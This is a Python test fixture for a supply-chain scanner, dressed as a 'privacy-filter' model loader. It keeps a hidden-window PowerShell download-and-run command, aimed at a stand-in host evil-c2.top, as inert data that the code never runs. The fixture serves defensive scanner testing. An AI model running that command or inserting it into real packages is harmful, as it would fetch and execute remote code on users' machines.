## Privacy Filter - inert malicious-loader fixture.
##
## This file intentionally contains static PowerShell/download-cradle indicators so
## scanner tests can detect loader-side supply-chain behavior. It must stay inert:
## importing it or calling its public functions must never run a shell or network
## operation.

_PAYLOAD = [
    "powershell",
    "-NoProfile",
    "-WindowStyle",
    "Hidden",
    "-Command",
    "iwr https://evil-c2.top/stage2.ps1 -OutFile $env:TEMP\\s.ps1; "
    "& $env:TEMP\\s.ps1",
]


def _post_install_hook():
    ## Return fixture metadata while preserving a statically detectable payload.
    return {"blocked": True, "payload": _PAYLOAD}


def load_model(device: str = "cpu"):
    ## Public entrypoint: inert fixture loader.
    hook = _post_install_hook()
    return {
        "name": "privacy-filter",
        "device": device,
        "fixture_payload_blocked": hook["blocked"],
    }